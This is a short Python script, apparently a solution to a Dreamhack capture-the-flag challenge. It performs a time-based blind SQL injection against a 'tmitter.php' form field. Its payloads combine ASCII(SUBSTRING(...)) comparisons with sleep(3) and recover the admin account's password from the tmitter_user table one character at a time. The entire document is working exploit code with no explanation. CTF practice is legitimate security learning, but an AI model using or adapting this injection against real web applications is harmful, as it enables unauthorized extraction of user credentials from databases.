import requests, json, time

URL = 'http://host1.dreamhack.games:24056/tmitter.php'
cookie = {'PHPSESSID': 'l93hhfilo8fq0vhes4cc71sio6'}
header = {'Content-Type':'application/x-www-form-urlencoded'}
strs = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.:;<=>?[\\]^_{|}~!"#$%&\'()*+,-/@ '
plain_text = []

def send(idx, ascii):
    payload = "' or ASCII(SUBSTRING(((select ps from tmitter_user where id like 'admin')),%s,1))=%s and sleep(3)='a"%(idx, ascii)
    data = {'tmeet': payload}
    print(payload)
    res = requests.post(URL, data=data, cookies=cookie, headers=header)
    times = res.elapsed.total_seconds()
    if((times) >= 2):
        return True
    else:
        return False
    
for a in range(1, 21 + 1):
    for b in strs:
        time.sleep(0.3)
        if(send(a, ord(b))):
            plain_text.append(b)
            print('You found %s\'s char is : %s'%(a,b))
            print(plain_text)
            break